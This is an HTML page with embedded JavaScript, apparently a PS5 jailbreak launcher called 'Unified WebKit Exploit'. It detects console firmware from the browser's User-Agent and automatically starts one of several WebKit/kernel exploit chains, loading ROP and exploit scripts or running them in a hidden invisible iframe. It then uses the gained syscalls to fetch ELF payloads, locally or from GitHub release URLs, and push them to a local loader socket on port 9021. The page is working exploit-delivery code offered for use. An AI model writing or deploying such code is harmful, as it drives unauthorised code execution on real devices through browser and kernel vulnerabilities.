<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Unified WebKit Exploit — InsideMatrixDev</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    width: 100%; height: 100%;
    background: #000; color: #e8e8e8;
    font: 15px/1.4 "Segoe UI", system-ui, sans-serif;
    overflow: hidden;
  }
  /* Overlay covers everything - user sees only black + our UI */
  #overlay {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: #000; z-index: 100;
    display: flex; flex-direction: column;
    padding: 20px 16px 16px; gap: 12px;
  }
  #uhead {
    display: flex; gap: 16px; align-items: center; justify-content: center; flex-wrap: wrap;
    flex-shrink: 0;
  }
  #ulogo {
    width: min(120px, 22vw); height: auto; border-radius: 10px; opacity: 0.9;
  }
  #uheadtxt { text-align: center; }
  h1 { font-size: 20px; letter-spacing: 2px; font-weight: 800; color: #fff; }
  #ubyline { font-size: 12px; color: #8fa0b3; margin-top: 2px; }
  #ufwline { font-size: 14px; color: #9fb1c3; margin-top: 4px; }
  #ufwline b { color: #fff; }

  /* Progress bar - fixed on screen */
  #progress-wrap {
    flex-shrink: 0;
    background: #111; border: 1px solid #333; border-radius: 8px;
    padding: 10px 14px;
  }
  #progress-label {
    font-size: 12px; color: #888; margin-bottom: 6px;
    display: flex; justify-content: space-between;
  }
  #progress-bar-bg {
    width: 100%; height: 10px; background: #222; border-radius: 5px; overflow: hidden;
  }
  #progress-bar-fill {
    width: 0%; height: 100%; background: #4a90e2; border-radius: 5px;
    transition: width 0.4s ease;
  }
  #progress-bar-fill.error { background: #e05561; }
  #progress-bar-fill.success { background: #47c76a; }
  #progress-pct {
    font-size: 13px; color: #fff; font-weight: 700; font-family: monospace;
  }

  /* Log area */
  #ulog {
    flex: 1;
    min-height: 0;
    background: #0a0a0a; border: 1px solid #222; border-radius: 10px;
    padding: 10px 12px;
    font: 12px/1.5 "Consolas", "DejaVu Sans Mono", monospace;
    color: #b9e6b0; white-space: pre-wrap; overflow-y: auto;
  }
  #ulog .err { color: #ff9a8a; }
  #ulog .warn { color: #ffd479; }
  #ulog .info { color: #9fc7ff; }
  #ulog .success { color: #7fd88a; }
  #ulog .stage { color: #ebcb8b; font-weight: 700; }

  #ucredits {
    flex-shrink: 0;
    font-size: 10px; color: #444; text-align: center; padding-top: 6px;
  }

  /* Hidden iframe - exploit engine runs here */
  #extframe {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: 0;
    z-index: 1; opacity: 0; pointer-events: none;
  }
</style>
</head>
<body>

<!-- Exploit engine iframe (invisible) -->
<iframe id="extframe" sandbox="allow-scripts allow-same-origin"></iframe>

<!-- User-visible overlay -->
<div id="overlay">
  <div id="uhead">
    <img id="ulogo" src="logo.jpg" alt="PS5"/>
    <div id="uheadtxt">
      <h1>UNIFIED WEBKIT EXPLOIT</h1>
      <div id="ubyline">by InsideMatrixDev</div>
      <div id="ufwline">detecting firmware...</div>
    </div>
  </div>

  <div id="progress-wrap">
    <div id="progress-label">
      <span id="progress-status">waiting...</span>
      <span id="progress-pct">0%</span>
    </div>
    <div id="progress-bar-bg">
      <div id="progress-bar-fill"></div>
    </div>
  </div>

  <div id="ulog"></div>

  <div id="ucredits">
    umtx2: abc, shahrilnet, n0llptr · poops/p2jb: soniciso1 · elfldr: john-tornblom
  </div>
</div>

<script>
(function () {
  var UX = ["1.00","1.01","1.02","1.05","1.10","1.11","1.12","1.13","1.14","2.00","2.20","2.25","2.26","2.30","2.50","2.70","3.00","3.10","3.20","3.21","4.00","4.02","4.03","4.50","4.51","5.00","5.02","5.10","5.50"];
  var POOPS = ["7.00","7.01","7.02","7.40","7.50","7.51","7.55","7.60","7.61","8.00","8.01","8.03","8.20","8.30","8.40","8.50","8.60","9.00","9.20","9.40","9.60","10.00","10.01","10.20","10.40","10.60","11.00","11.20","11.40","11.60","12.00"];
  var P2JB  = ["12.00","12.02","12.40","12.50","12.70"];

  var logEl = document.getElementById("ulog");
  var progressFill = document.getElementById("progress-bar-fill");
  var progressPct = document.getElementById("progress-pct");
  var progressStatus = document.getElementById("progress-status");

  function log(msg, cls) {
    var d = new Date();
    var t = ("0"+d.getHours()).slice(-2)+":"+("0"+d.getMinutes()).slice(-2)+":"+("0"+d.getSeconds()).slice(-2);
    var line = document.createElement("div");
    if (cls) line.className = cls;
    line.textContent = "["+t+"] "+msg;
    logEl.appendChild(line);
    logEl.scrollTop = logEl.scrollHeight;
  }

  function setProgress(pct, status, cls) {
    if(pct < 0) pct = 0;
    if(pct > 100) pct = 100;
    progressFill.style.width = pct + "%";
    progressPct.textContent = pct + "%";
    if(status) progressStatus.textContent = status;
    if(cls) {
      progressFill.className = cls;
    } else {
      progressFill.className = "";
    }
  }

  function has(list, fw) { for (var i=0;i<list.length;i++) if (list[i]===fw) return true; return false; }

  function setBase(href) {
    var b = document.createElement("base");
    b.href = href;
    document.head.appendChild(b);
  }
  function loadJs(src, isModule) {
    return new Promise(function (res, rej) {
      var s = document.createElement("script");
      if (isModule) s.type = "module";
      s.src = src;
      s.onload = res;
      s.onerror = function () { rej(new Error("failed to load " + src)); };
      document.body.appendChild(s);
    });
  }
  function loadSeq(list) {
    var p = Promise.resolve();
    list.forEach(function (src) { p = p.then(function () { return loadJs(src, false); }); });
    return p;
  }

  /* -------- payload sender -------- */
  var PAYLOADS = [
    { name: "shadowmountplus.elf", ghUrl: "https://github.com/drakmor/ShadowMountPlus/releases/download/1.6beta16/shadowmountplus.elf", local: "payload/shadowmountplus.elf" },
    { name: "OnionHEN.elf", ghUrl: "https://github.com/aydencharles/onionHEN/releases/download/v0.0.10/OnionHEN.elf", local: "payload/OnionHEN.elf" }
  ];

  async function fetchPayload(url) {
    try {
      var r = await fetch(url, {cache:"no-store"});
      if (!r.ok) return null;
      return await r.arrayBuffer();
    } catch (e) { return null; }
  }

  async function sendOnePayload(bytes, name) {
    try {
      if (typeof syscall !== "function") throw new Error("syscalls not available");
      var fd = syscall("socket", 2, 1, 0);
      if (fd < 0) throw new Error("socket() failed: " + fd);
      var addr = new Uint8Array(16);
      addr[0] = 0x10; addr[1] = 0x02;
      addr[2] = (9021 >> 8) & 0xFF; addr[3] = 9021 & 0xFF;
      addr[4] = 127; addr[5] = 0; addr[6] = 0; addr[7] = 1;
      var conn = syscall("connect", fd, addr, 16);
      if (conn < 0) { syscall("close", fd); throw new Error("connect() failed: " + conn); }
      var u8 = new Uint8Array(bytes);
      var sent = 0;
      while (sent < u8.length) {
        var chunk = u8.subarray(sent, Math.min(sent + 65536, u8.length));
        var w = syscall("write", fd, chunk, chunk.length);
        if (w < 0) { syscall("close", fd); throw new Error("write() failed: " + w); }
        sent += w;
      }
      syscall("close", fd);
      log(name + " sent successfully!", "success");
      return true;
    } catch (e) {
      log(name + " send failed: " + e.message, "err");
      return false;
    }
  }

  async function autoPayloadSequence() {
    log("Starting auto-payload sequence...", "info");
    setProgress(95, "sending payloads...");
    for (var i = 0; i < PAYLOADS.length; i++) {
      var p = PAYLOADS[i];
      log("Loading " + p.name + " ...");
      var buf = await fetchPayload(p.local);
      if (!buf) {
        log("Local not found, trying GitHub ...", "warn");
        buf = await fetchPayload(p.ghUrl);
      }
      if (!buf) {
        log("Could not download " + p.name + ". Place it in " + p.local, "err");
        continue;
      }
      log(p.name + " loaded (" + buf.byteLength + " bytes)");
      await sendOnePayload(buf, p.name);
      await new Promise(function(r){ setTimeout(r, 2000); });
    }
    log("All payloads dispatched. Closing browser in 3s...", "success");
    setProgress(100, "complete", "success");
    setTimeout(function(){
      try { window.open("","_self").close(); } catch(e){}
      try { window.close(); } catch(e){}
    }, 3000);
  }

  async function waitForElfldrThenPayload() {
    log("Waiting for elfldr on 127.0.0.1:9021 ...");
    setProgress(90, "waiting for elfldr...");
    for (var i = 0; i < 60; i++) {
      try {
        if (typeof syscall === "function") {
          var fd = syscall("socket", 2, 1, 0);
          if (fd >= 0) {
            var addr = new Uint8Array(16);
            addr[0] = 0x10; addr[1] = 0x02;
            addr[2] = (9021 >> 8) & 0xFF; addr[3] = 9021 & 0xFF;
            addr[4] = 127; addr[5] = 0; addr[6] = 0; addr[7] = 1;
            var conn = syscall("connect", fd, addr, 16);
            syscall("close", fd);
            if (conn >= 0) {
              log("elfldr is up!", "success");
              await autoPayloadSequence();
              return;
            }
          }
        }
      } catch (e) {}
      await new Promise(function(r){ setTimeout(r, 3000); });
    }
    log("elfldr did not come up in time", "warn");
    setProgress(0, "elfldr timeout", "error");
  }

  /* -------- umtx2 inline (1.xx-5.xx) -------- */
  function runUx() {
    log("loading umtx2 chain code...");
    setProgress(10, "loading umtx2...");
    setBase("ux/");
    window.alert = function (m) { log("alert: " + m, "warn"); };
    window.confirm = function (m) { log("confirm: " + m + " -> no", "warn"); return false; };
    return loadSeq(["int64.js", "rop.js", "main.js", "umtx2.js", "custom_host_stuff.js", "syscalls.js"])
      .then(function () { return loadJs("psfree/psfree.js", true); })
      .then(function () { return loadJs("payload_map.js", false); })
      .then(function () {
        log("umtx2 loaded — running exploit");
        setProgress(50, "running exploit...");
        run(false, false);
        waitForElfldrThenPayload();
      })
      .catch(function (e) { log("umtx2 failed: " + e.message, "err"); setProgress(0, "failed", "error"); });
  }

  /* -------- external chain via hidden iframe (7.xx-12.70) -------- */
  function runExt(url, name) {
    log("loading " + name + " chain...");
    setProgress(5, "loading " + name + "...");
    var frame = document.getElementById("extframe");
    frame.src = url;

    // Listen for logs from iframe bridge
    window.addEventListener("message", function onMsg(e){
      if (!e.data || !e.data.bridgeType) return;
      var d = e.data;
      if (d.bridgeType === "log" || d.bridgeType === "stage" || d.bridgeType === "early") {
        log("[" + (d.chain||"ext") + "] " + (d.text || d.msg || d.item || ""), d.bridgeType==="stage"?"stage":"info");
        if (d.progress > 0) setProgress(d.progress, (d.text || d.msg || "").slice(0, 40));
        if (d.progress === -1) setProgress(0, "error", "error");
      } else if (d.bridgeType === "error" || d.bridgeType === "rejection") {
        log("[" + (d.chain||"ext") + "] ERROR: " + (d.msg||""), "err");
        setProgress(0, "error", "error");
      } else if (d.bridgeType === "ready") {
        log("[" + (d.chain||"ext") + "] bridge ready");
      }
    });
  }

  /* -------- firmware routing & auto-run -------- */
  log("unified webkit exploit ready");
  setProgress(0, "detecting firmware...");
  var ua = navigator.userAgent;
  var m = ua.match(/PlayStation 5\/(\d+\.\d+)/);
  var fw = m ? m[1] : null;
  var q = new URLSearchParams(location.search);
  var forced = q.get("chain");

  var chain = null, name = null, extUrl = null;
  if (forced === "ux") { chain = "ux"; name = "umtx2 (forced)"; }
  else if (forced === "poops") { chain = "poops"; name = "poops (forced)"; extUrl = "ext/poops.html?go=1&auto=1&trigger=netcontrol&payload=1&v=128&nullfds=1"; }
  else if (forced === "p2jb") { chain = "p2jb"; name = "p2jb (forced)"; extUrl = "ext/p2jb.html?go=1&auto=1&trigger=netcontrol&payload=1&v=128"; }
  else if (fw && has(UX, fw)) { chain = "ux"; name = "umtx2"; }
  else if (fw && has(POOPS, fw) && !has(P2JB, fw)) { chain = "poops"; name = "poopsploit"; extUrl = "ext/poops.html?go=1&auto=1&trigger=netcontrol&payload=1&v=128&nullfds=1"; }
  else if (fw && has(P2JB, fw)) { chain = "p2jb"; name = "p2JB"; extUrl = "ext/p2jb.html?go=1&auto=1&trigger=netcontrol&payload=1&v=128"; }

  var fwline = document.getElementById("ufwline");
  var armed = false;

  if (!fw && !forced) {
    fwline.innerHTML = "<b>not a PS5 browser</b> — firmware not detected";
    log("User-Agent has no PlayStation 5 firmware tag: " + ua, "warn");
    setProgress(0, "no PS5 detected");
  } else {
    fwline.innerHTML = "firmware: <b>" + (fw || "?") + "</b>"
      + (name ? " &nbsp;&rarr;&nbsp; chain: <b>" + name + "</b>" : "");
    if (fw) log("detected PS5 firmware " + fw);
    if (!chain) {
      log("firmware " + fw + " is NOT supported (1.00-5.50, 7.00-12.70).", "err");
      setProgress(0, "not supported", "error");
    } else {
      log("chain selected: " + name + " — auto-run in 1s");
    }
  }

  function start(which, label) {
    if (armed) return;
    armed = true;
    log("starting " + label + " — do not touch the controller...");
    setTimeout(function () {
      if (which === "ux") runUx();
      else if (which === "poops" || which === "p2jb") runExt(extUrl, label);
    }, 1000);
  }

  /* auto-run after 1s if supported */
  if (chain && !forced) {
    setTimeout(function () {
      if (!armed) start(chain, name);
    }, 1000);
  }
})();
</script>
</body>
</html>
